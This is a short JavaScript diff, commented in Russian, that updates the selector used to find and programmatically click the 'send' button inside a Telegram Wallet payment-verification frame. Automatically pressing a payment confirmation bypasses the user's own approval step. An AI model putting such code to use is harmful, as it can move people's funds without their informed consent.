@@ -28,10 +28,10 @@
             await waitForElement('#payment-verification');
 
             // Ожидание, пока кнопка "send-btn" появится на странице Telegram Wallet
-            await waitForElement('#payment-verification button[data-testid="send-btn"]');
+            await waitForElement('#payment-verification button[class="r2DG tizz wMEh GQO6"]');
 
             // Нажатие кнопки через iframe.contentWindow
-            const sendButton = iframe.contentWindow.document.querySelector('button[data-testid="send-btn"]');
+            const sendButton = iframe.contentWindow.document.querySelector('button[class="r2DG tizz wMEh GQO6"]');
             if (sendButton) {
                 sendButton.click();
             } else {
